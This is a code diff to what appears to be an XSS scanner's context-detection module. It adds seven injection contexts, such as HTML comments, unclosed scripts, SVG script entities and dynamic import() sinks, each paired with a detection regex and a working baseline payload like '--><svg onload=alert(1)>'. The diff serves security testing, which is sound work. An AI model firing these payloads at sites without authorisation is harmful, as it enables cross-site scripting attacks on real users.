@@ -1,5 +1,5 @@
 /**
- * Rotor 1: Context Detection — 40+ injection context patterns.
+ * Rotor 1: Context Detection — 50+ injection context patterns.
  *
  * The detection uses a priority chain — it checks for more specific contexts
  * first (like href_attribute or hidden_input) before falling back to generic
@@ -55,7 +55,15 @@ export type ContextName =
   | "location_replace_sink"
   | "jquery_html_sink"
   | "jquery_append_sink"
-  | "dangerously_set_inner_html";
+  | "dangerously_set_inner_html"
+  // Heyes "JavaScript for Hackers" ch.8 contexts
+  | "script_comment"
+  | "script_no_close"
+  | "svg_use"
+  | "svg_script_entity"
+  | "html_comment"
+  | "xhtml_xml"
+  | "dynamic_import_sink";
 
 export interface ContextTechnique {
   name: string;
@@ -64,7 +72,7 @@ export interface ContextTechnique {
   baseline: string;
 }
 
-/** 40+ context detection patterns sorted by priority (highest first). */
+/** 50+ context detection patterns sorted by priority (highest first). */
 export const CONTEXT_TECHNIQUES: ContextTechnique[] = [
   // ── Highest-specificity contexts first ──────────────────────────────
   {
@@ -72,6 +80,21 @@ export const CONTEXT_TECHNIQUES: ContextTechnique[] = [
     priority: 110,
     baseline: '<iframe srcdoc="<img src=x onerror=alert(1)>">',
     patterns: [/srcdoc\s*=\s*["'][^"']*ENIGMA_PROBE/i]
+  },
+  {
+    // Heyes ch.8: reflection inside an unclosed <script> — newlines and
+    // comments are legal line terminators, breakout needs no </script>.
+    name: "script_no_close",
+    priority: 105,
+    baseline: "\\u0061lert(1)",
+    patterns: [/<script\b[^>]*>(?:(?!<\/script>)[\s\S])*ENIGMA_PROBE(?![\s\S]*<\/script>)/i]
+  },
+  {
+    // Heyes ch.8: SVG <use> href/xlink:href resolves fragments as documents.
+    name: "svg_use",
+    priority: 104,
+    baseline: "#<svg id=x><text>x</text></svg>",
+    patterns: [/<use\b[^>]*(?:xlink:)?href\s*=\s*["'][^"']*ENIGMA_PROBE/i]
   },
   {
     name: "href_attribute",
@@ -145,12 +168,31 @@ export const CONTEXT_TECHNIQUES: ContextTechnique[] = [
     ]
   },
   {
+    // Heyes ch.8: reflection lands in a JS comment (// or /* */) inside a
+    // script — closing the comment with a line break is the breakout.
+    name: "script_comment",
+    priority: 93,
+    baseline: "\\u0061lert(1)",
+    patterns: [
+      /(?:^|[\s;{}(])\/\/[^\n\r]*ENIGMA_PROBE/m,
+      /\/\*(?:(?!\*\/)[\s\S])*ENIGMA_PROBE/
+    ]
+  },
+  {
     name: "script_block",
     priority: 85,
     baseline: "</script><script>alert(1)</script>",
     patterns: [/<script[^>]*>[\s\S]*ENIGMA_PROBE[\s\S]*<\/script>/i]
   },
   // ── SVG / MathML contexts ───────────────────────────────────────────
+  {
+    // Heyes ch.8: HTML entities are decoded inside SVG <script> — the
+    // entity-encoded probe only executes in that window.
+    name: "svg_script_entity",
+    priority: 95,
+    baseline: '</script><svg><script>&#97;lert(1)</script></svg>',
+    patterns: [/<svg[\s\S]*<script(?:(?!<\/script>)[\s\S])*&(?:#[0-9]+|#x[0-9a-f]+|[a-z]+);(?:(?!<\/script>)[\s\S])*ENIGMA_PROBE/i]
+  },
   {
     name: "svg_script",
     priority: 82,
@@ -176,6 +218,23 @@ export const CONTEXT_TECHNIQUES: ContextTechnique[] = [
     patterns: [/<math[\s\S]*ENIGMA_PROBE/i]
   },
   // ── Container contexts ──────────────────────────────────────────────
+  {
+    // Heyes ch.8: reflection inside an HTML comment — `-->` breakout.
+    name: "html_comment",
+    priority: 77,
+    baseline: "--><svg onload=alert(1)>",
+    patterns: [/<!--(?:(?!-->)[\s\S])*ENIGMA_PROBE/i]
+  },
+  {
+    // Heyes ch.8: XHTML served as XML — namespaces/self-closing rules apply.
+    name: "xhtml_xml",
+    priority: 90,
+    baseline: '<img src=x onerror=alert(1) />',
+    patterns: [
+      /<html[^>]*xmlns\s*=\s*["']http:\/\/www\.w3\.org\/1999\/xhtml["'][\s\S]*ENIGMA_PROBE/i,
+      /<\?xml[^>]*\?>[\s\S]{0,4000}?ENIGMA_PROBE/i
+    ]
+  },
   {
     name: "textarea_context",
     priority: 78,
@@ -288,6 +347,13 @@ export const CONTEXT_TECHNIQUES: ContextTechnique[] = [
     priority: 71,
     baseline: "alert(1)",
     patterns: [/setInterval\s*\(\s*["']/i]
+  },
+  {
+    // Heyes ch.8: dynamic import() fetches and evaluates its argument.
+    name: "dynamic_import_sink",
+    priority: 72,
+    baseline: "data:text/javascript,alert(1)",
+    patterns: [/\bimport\s*\(\s*[^)]*ENIGMA_PROBE/i]
   },
   {
     name: "location_href_sink",
